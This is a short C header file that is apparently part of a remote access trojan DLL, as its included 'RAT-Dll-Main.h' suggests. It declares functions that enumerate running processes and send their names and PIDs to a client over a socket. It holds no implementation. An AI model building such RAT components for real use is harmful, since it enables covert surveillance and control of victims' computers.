#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include "RAT-Dll-Main.h"

INT handleProcessList(SOCKET clientSock);

INT doProcessList(__inout char*** processNames, __inout DWORD** processPIDs, __inout INT* numProcesses);

INT sendProcesses(SOCKET clientSock, char** processNames, DWORD* processPIDs, INT numProcesses);